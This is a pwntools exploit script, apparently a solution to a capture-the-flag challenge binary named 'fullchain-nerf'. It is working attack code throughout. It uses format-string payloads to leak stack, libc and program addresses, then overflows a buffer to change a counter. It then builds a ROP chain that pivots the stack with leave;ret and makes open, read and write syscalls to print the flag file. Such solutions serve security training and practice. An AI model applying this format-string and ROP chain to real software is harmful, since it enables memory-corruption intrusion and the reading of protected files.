from pwn import *
import sys

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
init-pwndbg
# b 50
b global
b 73
"""

if len(sys.argv) > 1:
    p = gdb.debug("./fullchain-nerf", gdbscript=script, level="debug")
else:
    p = process("./fullchain-nerf")

local_to_cnt = 0x24

# local_addr
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"write%p")
p.recvuntil(b"write0x")
local_addr = int(p.recv(12), 16)
log.info(f"local_addr: {hex(local_addr)}") # 340
log.info(f"cnt_addr: {hex(local_addr+local_to_cnt)}") # 364

# cnt set
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendlineafter(b"length > ", b"96")
pl = flat(b"a" * local_to_cnt, p64(10))
p.sendline(pl)
log.info("cnt set")

# leak __libc_start_main
p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"write%39$p%9$p")

p.recvuntil(b"write0x")
libc_start_main_addr = int(p.recv(12), 16)
libc_base_addr = libc_start_main_addr - (0x292c0 + 138)
log.info(f"libc_start_main_addr: {hex(libc_start_main_addr)}") # 34a
log.info(f"libc_base_addr: {hex(libc_base_addr)}") # 000

# leak chal
p.recvuntil(b"0x")
chal_addr = int(p.recv(12), 16) - 359
flag_dir = chal_addr - 0x146a + 0x2080 + 40
global_addr = chal_addr - 0x559954e7c46a + 0x559954e7f0a0
log.info(f"chal_addr: {hex(chal_addr)}") # 46a
log.info(f"flag_dir: {hex(flag_dir)}")
log.info(f"global_addr: {hex(global_addr)}") # 0a0

# ROP
pop_rax_ret = 0x0000000000041770 + libc_base_addr
pop_rdi_ret = 0x0000000000029835 + libc_base_addr
pop_rsi_ret = 0x000000000002b151 + libc_base_addr
pop_rdx_rbx_ret = 0x00000000000884a9 + libc_base_addr
syscall_ret = 0x0000000000089386 + libc_base_addr
leave_ret = 0x0000000000050c27 + libc_base_addr
log.info(f"syscall_ret: {hex(syscall_ret)}") # 386
log.info(f"leave_ret: {hex(leave_ret)}") #c27

p.sendlineafter(b"global or local > ", b"global")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendlineafter(b"length > ", b"96")

big_read = flat(
    pop_rax_ret, 0,
    pop_rdi_ret, 0,
    pop_rsi_ret, global_addr+0x50,
    pop_rdx_rbx_ret, 0xf0, 0,
    syscall_ret, 
)

orw = flat(
    pop_rax_ret, 2,
    pop_rdi_ret, flag_dir,
    pop_rsi_ret, 0,
    syscall_ret, 

    pop_rax_ret, 0,
    pop_rdi_ret, 3,
    pop_rsi_ret, local_addr,
    pop_rdx_rbx_ret, 0x20, 0,
    syscall_ret, 

    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    syscall_ret, 
)

p.sendline(big_read)
log.info("write big_read rop at global")

p.sendlineafter(b"global or local > ", b"local")
p.sendlineafter(b"set, read or write > ", b"read")
p.sendlineafter(b"length > ", b"96")
pl = flat(b"a" * 36, p64(0), b"a" * 4, global_addr-8, leave_ret) # 098, c27
p.sendline(pl)
p.sendlineafter(b"Bye ~", orw)

log.info(p.recvlineS())
p.interactive()
